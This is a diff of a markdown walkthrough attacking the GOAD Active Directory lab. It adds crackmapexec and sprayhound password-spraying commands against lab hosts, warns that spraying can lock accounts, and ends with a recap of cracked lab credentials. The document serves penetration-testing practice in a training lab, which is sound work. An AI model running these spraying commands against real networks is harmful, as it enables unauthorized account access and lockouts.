@@ -22,14 +22,12 @@
   - [Password Spraying](#password-spraying)
     - [Password Spraying with Heartsbane password](#password-spraying-with-heartsbane-password)
     - [Password Spraying with iseedeadpeople password](#password-spraying-with-iseedeadpeople-password)
+    - [Password Spraying with name of the users as password](#password-spraying-with-name-of-the-users-as-password)
+      - [Use Sprayhound to avoid this problem](#use-sprayhound-to-avoid-this-problem)
   - [Acces to the organization remotely](#acces-to-the-organization-remotely)
     - [Using Bloodhound with runas ouside the domain](#using-bloodhound-with-runas-ouside-the-domain)
     - [Runas with iseedeadpeople password ( ADExplorer Dump )](#runas-with-iseedeadpeople-password--adexplorer-dump-)
-  - [Kerberoasting](#kerberoasting)
-    - [Linux](#linux-1)
-  - [**Kerberoasting**](#kerberoasting-1)
-    - [Linux](#linux-2)
-    - [Windows](#windows-1)
+- [Recap of the assesment 12/22/2022](#recap-of-the-assesment-12222022)
 - [Bibliography](#bibliography)
 
 # Enumeration
@@ -374,9 +372,35 @@ Password: `iseedeadpeople`.
 ### Password Spraying with Heartsbane password
 
 ```bash
+crackmapexec smb ips.txt -u krb-users.txt -p Heartsbane
 ```
 
+![Heartsbane](../assets/images/pwdHeart.png)
+
 ### Password Spraying with iseedeadpeople password
+
+```bash
+crackmapexec smb ips.txt -u krb-users.txt -p iseedeadpeople
+```
+
+![People](../assets/images/pwdPeople.png)
+
+### Password Spraying with name of the users as password
+
+```bash
+crackmapexec smb ips.txt -u krb-users.txt -p krb-users.txt
+```
+![Users](../assets/images/pwdUsers.png)
+
+> DANGER DANGER DANGER can LOCK the account bc the number of attempts
+#### Use Sprayhound to avoid this problem
+
+```bash
+sprayhound -U krb-users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 --lower -t 2
+```
+
+![Sprayhound](../assets/images/sprayhound.png)
+
 
 ## Acces to the organization remotely
 
@@ -457,16 +481,21 @@ python3 ../../Downloads/ADExplorerSnapshot.py/ADExplorerSnapshot.py ../GOAD_v2_W
 
 ![bloodhound](/assets/images/bloodHoundCap.png)
 
-## Kerberoasting
+# Recap of the assesment 12/22/2022
 
-### Linux
+List of the important info we gathered:
 
-## **Kerberoasting**
-
-### Linux
-
-### Windows
+  - Users and passwords:
+    - samwell.tarly:Heartsbane 
+      - `User description`
+    - brandon.stark:iseedeadpeople 
+      - `Asreproasting`
+    - hodor:hodor 
+      - Password Spraying using `SPRAYHOUND`
+   - AD dumped with `ADExplorer` and `ADExplorerSnapshot.py` tool
+     - Bloodhound graph
 
 # Bibliography
 
 [Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
+[lsassy](https://github.com/Hackndo/lsassy)
